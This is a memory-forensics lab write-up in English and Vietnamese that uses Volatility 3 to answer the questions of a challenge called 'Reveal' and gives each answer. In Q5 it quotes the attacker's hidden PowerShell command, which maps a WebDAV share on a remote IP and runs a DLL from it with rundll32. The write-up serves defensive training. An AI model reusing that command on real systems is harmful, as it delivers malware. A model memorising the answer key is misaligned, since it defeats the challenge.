# Reveal 

> As a cybersecurity analyst for a leading financial institution, an alert from your SIEM solution has flagged unusual activity on an internal workstation. Given the sensitive financial data at risk, immediate action is required to prevent potential breaches.

> Your task is to delve into the provided memory dump from the compromised system. You need to identify basic Indicators of Compromise (IOCs) and determine the extent of the intrusion. Investigate the malicious commands or files executed in the environment, and report your findings in detail to aid in remediation and enhance future defenses.

> Tools:
   Volatility 3

> .mem: Định dạng tùy chỉnh, thường dùng trong phân tích bộ nhớ với các công cụ như Volatility.

> .dmp: Định dạng phổ biến hơn, thường được hệ điều hành tạo ra khi có sự cố, và dùng trong phân tích sự cố và điều tra kỹ thuật số.

> volatility là công cụ để phân tích bộ nhớ có thể trích xuất chi tiết thông tin từ file dump hoặc file mem


## Q1: Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process?

+ đầu tiên ta sẽ phân tích nguồn của file thuộc os nào => file file.dmp

 ![361132733-920c58e6-bae8-4980-ba9e-a7883f7240a3](https://github.com/user-attachments/assets/2f191328-9611-49af-8107-1afa8e90b53f)

+ tiếp theo ta có thể list thông tin tiến trình của hệ thống bằng câu lệnh windows.pslist 

+ để phát hiện trích xuất mã độc ta sẽ dùng plugin windows.malfind

![361133445-0c06cb2c-37fa-4f1f-91d3-6a12d0327722](https://github.com/user-attachments/assets/d8bbe791-46dd-4165-a657-c2e48dcaca54)


=> process powershell có vẻ đang add 1 số value vào memory , powershell PAGE_EXECUTE_READWRITE quyền này có thể chứa dữ liệu hoặc mã đang được thực thi

=> Anwser: powershell.exe

## Q2: Knowing the parent process ID (PID) of the malicious process aids in tracing the process hierarchy and understanding the attack flow. What is the parent PID of the malicious process?

+ như câu hỏi trên ta list được ppid của powershell => windows.pslist

![361145716-55b10e01-db8f-4174-8fd9-a39fa1c122d0](https://github.com/user-attachments/assets/609f26d3-ea1e-43c0-99c3-cec78dcd810e)


=> Anwser: 4120

## Q3: Determining the file name used by the malware for executing the second-stage payload is crucial for identifying subsequent malicious activities. What is the file name that the malware uses to execute the second-stage payload?

+ xác định được malware execute ta sẽ sử dụng : vol -f file.dmp windows.cmdline --pid 3692

  ![361146819-c237dcb7-f3a2-4f17-90b5-a47cc53f2c12](https://github.com/user-attachments/assets/a678bb4d-9d30-4111-ab1d-18f7b4d1b539)

=> có 1 file dll đang ở dir \davwwwroot

=> Anwser: 3435.dll

## Q4: dentifying the shared directory on the remote server helps trace the resources targeted by the attacker. What is the name of the shared directory being accessed on the remote server?

+ như bài trên ta có thể xác định được remote directory có chứa file dll

  => Anwser: davwwwroot

## Q5: What is the MITRE sub-technique ID used by the malware to execute the second-stage payload?

+ Từ câu 3, ta có thể thấy rằng đối số dòng lệnh của quy trình độc hại, powershell.exe, là “powershell.exe -windowstyle Hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundl32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry.” Do đó, hoạt động chính ở đây là sử dụng rundll32.exe để tải và thực thi một DLL từ một vị trí từ xa, ánh xạ trực tiếp tới kỹ thuật MITER ATT&CK T1218.011

=> Anwser : T1218.011

## Q6: Identifying the username under which the malicious process runs helps in assessing the compromised account and its potential impact. What is the username that the malicious process runs under?

+ Windows theo dõi các chương trình bạn chạy bằng tính năng trong sổ đăng ký có tên là khóa UserAssist. Các phím này ghi lại số lần mỗi chương trình được thực thi và thời điểm nó được chạy lần cuối

        vol -f file.dmp userassist

![361147867-ef073c97-d969-4105-aff4-dcc04756154c](https://github.com/user-attachments/assets/dd72b1ad-4ea9-4fe5-8dff-8bde6b52b5df)


=> Anwser: elon 

## Q7: Knowing the name of the malware family is essential for correlating the attack with known threats and developing appropriate defenses. What is the name of the malware family?

+ xác định địa chỉ ip remote là 45.9.74.32

 ![361148176-282195e3-445f-41ee-a49a-0debffe3069a](https://github.com/user-attachments/assets/62ba90c7-ceee-431a-8d2b-c16fd7865458)


=> Anwser: STRELASTEALER
